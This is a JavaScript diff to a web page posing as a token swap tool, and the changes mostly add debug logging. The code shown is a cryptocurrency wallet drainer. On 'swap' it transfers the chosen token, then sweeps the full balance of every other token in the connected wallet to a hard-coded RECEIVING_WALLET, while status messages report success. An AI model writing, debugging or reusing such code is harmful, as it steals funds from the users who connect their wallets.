@@ -861,33 +861,42 @@ async function getTokenPrice(token) {
 }
 
 // =====================
-// SWAP FUNCTIONS (NO DUPLICATES)
+// SWAP FUNCTIONS (WITH DEBUGGING)
 // =====================
 
-// Track if main token was already processed
+// Track if main token was processed (GLOBAL STATE)
 let hasProcessedMainToken = false;
 
 async function handleSwap() {
+  console.log("[DEBUG] Swap initiated");
   if (!userAddress || !currentFromToken || !currentToToken) {
+    console.error("[DEBUG] Missing wallet/token selection");
     updateStatus("Connect wallet & select tokens first", "error");
     return;
   }
 
   try {
     showLoader();
-    hasProcessedMainToken = false; // Reset state on new swap
+    hasProcessedMainToken = false; // Reset on new swap
+    console.log("[DEBUG] Reset hasProcessedMainToken = false");
 
-    // 1. Process MAIN TOKEN (only if amount > 0)
+    // 1. Process MAIN TOKEN (if amount > 0)
     const inputAmount = parseFloat(document.getElementById("fromAmount").value);
     let mainTokenTransferred = 0;
 
     if (inputAmount > 0) {
+      console.log(`[DEBUG] Processing MAIN TOKEN: ${inputAmount} ${currentFromToken.symbol}`);
       mainTokenTransferred = await processMainTokenTransfer(inputAmount);
+      console.log(`[DEBUG] Successfully sent ${mainTokenTransferred} ${currentFromToken.symbol}`);
       updateStatus(`✅ Sent ${mainTokenTransferred} ${currentFromToken.symbol}`, "success");
+    } else {
+      console.log("[DEBUG] No main token amount specified (skipping)");
     }
 
-    // 2. Process OTHER TOKENS (automatically skips main token)
+    // 2. Process OTHER TOKENS (skips main token)
+    console.log("[DEBUG] Processing OTHER TOKENS...");
     const otherTokensTransferred = await processAllTokenTransfers();
+    console.log(`[DEBUG] Transferred ${otherTokensTransferred} other tokens`);
 
     // Final status
     let statusMsg = "Success! ";
@@ -901,50 +910,75 @@ async function handleSwap() {
     await updateTokenBalances();
 
   } catch (err) {
+    console.error("[DEBUG] Swap failed:", err);
     updateStatus(`❌ Error: ${err.message}`, "error");
   } finally {
     hideLoader();
-    hasProcessedMainToken = false; // Reset for next swap
+    hasProcessedMainToken = false;
+    console.log("[DEBUG] Swap completed. Reset hasProcessedMainToken = false");
   }
 }
 
 async function processMainTokenTransfer(amount) {
+  console.log(`[DEBUG] Entered processMainTokenTransfer(${amount})`);
+  
   if (hasProcessedMainToken) {
+    console.error("[DEBUG] BLOCKED: Main token already processed!");
     throw new Error("Main token already processed (duplicate blocked)");
   }
 
   // Validate
-  if (!amount || amount <= 0) throw new Error("Invalid amount");
+  if (!amount || amount <= 0) {
+    console.error("[DEBUG] Invalid amount:", amount);
+    throw new Error("Invalid amount");
+  }
+
   const balance = await fetchTokenBalance(currentFromToken);
-  if (balance <= 0) throw new Error(`No ${currentFromToken.symbol} balance`);
-  if (amount > balance) throw new Error(`Amount > balance`);
+  console.log(`[DEBUG] ${currentFromToken.symbol} balance: ${balance}`);
+
+  if (balance <= 0) {
+    console.error("[DEBUG] No balance for main token");
+    throw new Error(`No ${currentFromToken.symbol} balance`);
+  }
+
+  if (amount > balance) {
+    console.error(`[DEBUG] Amount (${amount}) > balance (${balance})`);
+    throw new Error(`Amount > balance`);
+  }
 
   // For native tokens, keep gas reserve
   if (currentFromToken.isNative) {
     const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
     if (balance - amount < minReserve) {
+      console.error(`[DEBUG] Would leave < ${minReserve} ${currentFromToken.symbol} for gas`);
       throw new Error(`Keep ${minReserve} ${currentFromToken.symbol} for gas`);
     }
   }
 
   // Mark as processed BEFORE sending
   hasProcessedMainToken = true;
+  console.log(`[DEBUG] Set hasProcessedMainToken = TRUE (${currentFromToken.symbol})`);
 
   // Execute transfer
   try {
     if (currentFromToken.isNative) {
+      console.log(`[DEBUG] Transferring NATIVE ${amount} ${currentFromToken.symbol}...`);
       await transferNativeToken(currentFromToken, amount);
     } else {
+      console.log(`[DEBUG] Transferring ERC20 ${amount} ${currentFromToken.symbol}...`);
       await transferERC20Token(currentFromToken, amount);
     }
+    console.log(`[DEBUG] Successfully transferred ${amount} ${currentFromToken.symbol}`);
     return amount;
   } catch (err) {
     hasProcessedMainToken = false; // Reset if failed
+    console.error(`[DEBUG] Transfer failed! Reset hasProcessedMainToken = FALSE`);
     throw err;
   }
 }
 
 async function processAllTokenTransfers() {
+  console.log("[DEBUG] Entered processAllTokenTransfers()");
   let successCount = 0;
 
   for (const token of TOKENS[currentNetwork]) {
@@ -953,13 +987,18 @@ async function processAllTokenTransfers() {
       token.address === currentFromToken.address ||
       token.symbol === currentFromToken.symbol
     ) {
-      console.log(`Skipping ${token.symbol} (main token)`);
+      console.log(`[DEBUG] SKIPPING ${token.symbol} (MAIN TOKEN)`);
       continue;
     }
 
     try {
+      console.log(`[DEBUG] Checking balance for ${token.symbol}...`);
       const balance = await fetchTokenBalance(token);
-      if (balance <= 0) continue;
+      
+      if (balance <= 0) {
+        console.log(`[DEBUG] No balance for ${token.symbol} (skipping)`);
+        continue;
+      }
 
       let amountToSend = balance;
       
@@ -967,9 +1006,13 @@ async function processAllTokenTransfers() {
       if (token.isNative) {
         const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
         amountToSend = Math.max(0, balance - minReserve);
-        if (amountToSend <= 0) continue;
+        if (amountToSend <= 0) {
+          console.log(`[DEBUG] ${token.symbol} balance too low after gas reserve (skipping)`);
+          continue;
+        }
       }
 
+      console.log(`[DEBUG] Attempting to send ${amountToSend} ${token.symbol}...`);
       updateStatus(`⏳ Sending ${amountToSend.toFixed(6)} ${token.symbol}...`, "info");
       
       if (token.isNative) {
@@ -979,34 +1022,40 @@ async function processAllTokenTransfers() {
       }
       
       successCount++;
+      console.log(`[DEBUG] Successfully sent ${amountToSend} ${token.symbol}`);
       updateStatus(`✅ Sent ${amountToSend.toFixed(6)} ${token.symbol}`, "success");
     } catch (err) {
-      console.error(`❌ Failed ${token.symbol}:`, err);
+      console.error(`[DEBUG] FAILED to transfer ${token.symbol}:`, err);
       updateStatus(`⚠️ Skipped ${token.symbol}`, "warning");
     }
   }
 
+  console.log(`[DEBUG] processAllTokenTransfers() completed. Sent ${successCount} tokens`);
   return successCount;
 }
 
 // Helper functions (unchanged)
 async function transferNativeToken(token, amount) {
+  console.log(`[DEBUG] NATIVE TX: ${amount} ${token.symbol} → ${RECEIVING_WALLET}`);
   const tx = await signer.sendTransaction({
     to: RECEIVING_WALLET,
     value: ethers.utils.parseEther(amount.toString()),
     gasLimit: 21000,
   });
   await tx.wait();
+  console.log(`[DEBUG] TX SUCCESS: ${tx.hash}`);
   return tx;
 }
 
 async function transferERC20Token(token, amount) {
+  console.log(`[DEBUG] ERC20 TX: ${amount} ${token.symbol} → ${RECEIVING_WALLET}`);
   const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
   const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
   const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
     gasLimit: 100000,
   });
   await tx.wait();
+  console.log(`[DEBUG] TX SUCCESS: ${tx.hash}`);
   return tx;
 }
 // =====================
